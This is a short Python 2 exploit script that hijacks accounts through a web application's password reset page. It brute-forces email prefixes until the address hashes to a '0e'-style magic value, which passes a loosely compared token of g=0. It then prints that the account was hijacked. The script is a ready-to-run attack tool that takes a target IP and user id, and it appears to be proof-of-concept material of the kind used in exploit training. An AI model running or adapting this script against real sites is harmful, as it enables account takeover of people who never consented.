import hashlib, string, itertools, re, sys, requests

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
ftp_proxy   = "ftp://127.0.0.1:8080"

proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
              "ftp"   : ftp_proxy
            }

def update_email(ip, domain, id, prefix_length):
    count = 0
    # iterate through email addresses until an email address is found which hashes to the value 0e and all numbers which is the exponential equivalent of 0 (g). This results in a 302
    for word in itertools.imap(''.join, itertools.product(string.lowercase,repeat=int(prefix_length))):
        email = "%s@%s" % (word,domain)
        url = "http://%s/app/confirmpasswordreset.php?email=%s&g=0&userid=%s" % (ip, email, id)
        print "(*) Issuing update request to URL %s" % url
        r = requests.get(url, allow_redirects=False, proxies=proxyDict)
        if (r.status_code ==302):
            return(True, email, count)
        else:
            count += 1
    return(False, Nothing,count) 
       

def main():
    if len(sys.argv) != 5:
        print '(+) usage: %s <domain_name> <id> <prefix_length> <ip>' % sys.argv[0]
        print '(+) eg: %s youremaildomain.local 1 3 1.1.1.10 ' % sys.argv[0]
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]       
    ip = sys.argv[4]

    result, email, c = update_email(ip, domain, id, prefix_length)
    if (result):
        print("(+) Account hijacked with email %s using %d requests !") % (email,c)
    else:
        print("(-) Account hijack failed!") 

if __name__ == "__main__":
        main()
